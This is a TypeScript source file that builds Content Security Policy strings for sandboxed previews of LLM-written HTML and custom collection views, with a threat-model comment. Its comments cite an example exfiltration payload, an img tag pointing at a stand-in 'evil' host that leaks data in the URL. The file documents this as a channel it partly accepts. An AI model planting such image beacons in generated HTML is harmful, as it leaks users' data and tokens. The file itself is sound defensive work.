// CSP whitelist applied to HTML files previewed in the Files
// explorer iframe. We ship a narrow list of trusted CDNs that the
// LLM commonly pulls from (Chart.js, D3, Tailwind, etc. via
// jsdelivr / unpkg / cdnjs) plus Google Fonts. Anything else —
// random `https://` origins, phone-home `fetch()` calls, etc. —
// is rejected.
//
// Widen by editing `HTML_PREVIEW_CSP_ALLOWED_CDNS` below. Keep the
// list audited — every entry is a potential supply-chain surface.

export const HTML_PREVIEW_CSP_ALLOWED_CDNS: readonly string[] = [
  "https://cdn.jsdelivr.net",
  "https://unpkg.com",
  "https://cdnjs.cloudflare.com",
  "https://fonts.googleapis.com",
  "https://fonts.gstatic.com",
  // Plotly's official CDN. The LLM defaults to this URL when it
  // includes a Sankey or other Plotly chart in presentHtml output —
  // Plotly's docs recommend it, so unconditioned LLM output ends up
  // pointing here. Also reachable through jsdelivr, but adding the
  // first-party CDN keeps historical artifacts (where the URL is
  // already baked into the file on disk) rendering correctly.
  "https://cdn.plot.ly",
];

/**
 * Build the CSP string. Split from the wrapper so tests can exercise
 * the policy without HTML-template noise.
 *
 * `origin`, when provided, replaces `'self'` in `img-src`. The preview
 * iframe is `sandbox="allow-scripts"` only, so its document has an
 * opaque origin: Safari/WebKit matches `'self'` against the (opaque)
 * origin tuple and rejects every same-origin image request. Chrome
 * matches `'self'` against the document URL and works either way. Pass
 * the explicit server origin from HTTP-header callers; leave it
 * undefined for the `srcdoc` fallback (where `'self'` is meaningless
 * either way and there are no same-origin refs to resolve).
 */
function buildCsp(connectSrc: string, imgSelf: string, cdns: readonly string[], extraImgSrc = ""): string {
  const cdnList = cdns.join(" ");
  const imgExtra = extraImgSrc ? ` ${extraImgSrc}` : "";
  return [
    "default-src 'none'",
    // LLM-authored HTML almost always uses inline <script> blocks
    // alongside the CDN load. No feasible path to avoid
    // 'unsafe-inline' without rewriting every output.
    `script-src 'unsafe-inline' ${cdnList}`,
    `style-src 'unsafe-inline' ${cdnList}`,
    `font-src ${cdnList}`,
    // Images: same-origin (workspace files via /api/files/raw), CDN
    // whitelist, plus data: and blob: for inline PNGs and dynamically-
    // generated charts. Wildcard is deliberately avoided here — an attacker
    // who plants an <img src="https://evil/?leak="> in preview HTML
    // could exfiltrate data via image requests even with connect-src
    // blocked. Widen via HTML_PREVIEW_CSP_ALLOWED_CDNS if LLM output
    // legitimately needs more hosts. `extraImgSrc` lets a specific caller
    // (custom views) opt into a broader source set — see buildCustomViewCsp.
    `img-src ${imgSelf} ${cdnList} data: blob:${imgExtra}`,
    `connect-src ${connectSrc}`,
  ].join("; ");
}

export function buildHtmlPreviewCsp(origin?: string, cdns: readonly string[] = HTML_PREVIEW_CSP_ALLOWED_CDNS): string {
  // Block XHR / fetch / WebSocket so previews can't phone home or
  // exfiltrate anything the inline scripts happen to compute.
  return buildCsp("'none'", origin ?? "'self'", cdns);
}

/**
 * CSP for a custom collection view (see plans/feat-collections-custom-views.md).
 * Same policy as the preview header EXCEPT `connect-src` is the server origin
 * (not `'none'`): a custom view legitimately `fetch()`es its collection's data
 * endpoint.
 *
 * Threat model — a custom view is handed a scoped token (`window.__MC_VIEW`) +
 * the collection's records, so we must prevent exfiltration to an attacker:
 *   - **`connect-src` = the server origin only.** This is the channel that
 *     matters: fetch / XHR / WebSocket / sendBeacon / EventSource to an
 *     arbitrary host is what lets a malicious view stream the token/data out.
 *     Locked to the origin, the view can reach ONLY its own data endpoint.
 *   - **Script / style / font loads reuse the curated CDN allowlist.** A
 *     `<… src="https://cdn/x?token">` request does reach that host, but the
 *     allowlist is reputable infrastructure (jsdelivr / unpkg / cdnjs / Google
 *     Fonts / plotly) that does NOT expose per-request logs to third parties,
 *     so the token lands in the CDN's logs, never an attacker's. The
 *     allowlist-exfil bypass needs an attacker-CONTROLLABLE allowed host (open
 *     redirect, logging endpoint, attacker subdomain); none here qualify. This
 *     also lets views use charting libs (Chart.js, Plotly, D3) from a CDN.
 *   - **`img-src` additionally allows any `https:` host.** Feed/collection
 *     records routinely carry external image URLs (e.g. an RSS feed's article
 *     thumbnails), and a view must be able to render them. This re-admits a
 *     limited, ONE-WAY exfiltration channel — a compromised view could encode
 *     record data into an `<img src="https://evil/?leak=…">` URL — which the
 *     `connect-src` lock alone does not close. We accept it: the views are
 *     authored by the user's own agent over the user's own data, the channel is
 *     GET-only and URL-length-bounded (no response is readable), and `fetch` /
 *     XHR / WebSocket / beacon stay origin-locked, so bulk/bidirectional exfil
 *     is still blocked. If you need the strict guarantee back, proxy images
 *     through the origin instead of widening `img-src`.
 *
 * `origin` MUST be the explicit server origin: the sandboxed iframe has an
 * opaque origin, so `'self'` would never match (same reason the preview policy
 * substitutes the origin into `img-src`).
 */
export function buildCustomViewCsp(origin: string, cdns: readonly string[] = HTML_PREVIEW_CSP_ALLOWED_CDNS): string {
  return buildCsp(origin, origin, cdns, "https:");
}

/**
 * Build the CSP string for the print-mode hidden iframe (presentHtml's
 * printToPdf). Same policy as the preview header with the explicit
 * server origin substituted for `'self'` — see `buildHtmlPreviewCsp`
 * for why the substitution is required.
 */
export function buildPrintCspContent(origin: string, cdns: readonly string[] = HTML_PREVIEW_CSP_ALLOWED_CDNS): string {
  return buildHtmlPreviewCsp(origin, cdns);
}

const CSP_META_NONCE = ""; // reserved for future use (per-render nonce)

/**
 * Inject a `<meta http-equiv="Content-Security-Policy">` tag into the
 * HTML head. If the HTML has no `<head>`, wrap it as a full document
 * with a synthetic head so the meta tag is honoured regardless.
 *
 * Pure — doesn't touch the DOM. Safe to use from both client and
 * tests.
 */
export function wrapHtmlWithPreviewCsp(html: string): string {
  const csp = buildHtmlPreviewCsp();
  const meta = `<meta http-equiv="Content-Security-Policy" content="${csp}">`;
  if (/<head\b[^>]*>/i.test(html)) {
    return html.replace(/(<head\b[^>]*>)/i, `$1${meta}`);
  }
  // No <head> — treat as fragment and wrap it.
  return `<!DOCTYPE html><html><head>${meta}</head><body>${html}</body></html>${CSP_META_NONCE}`;
}
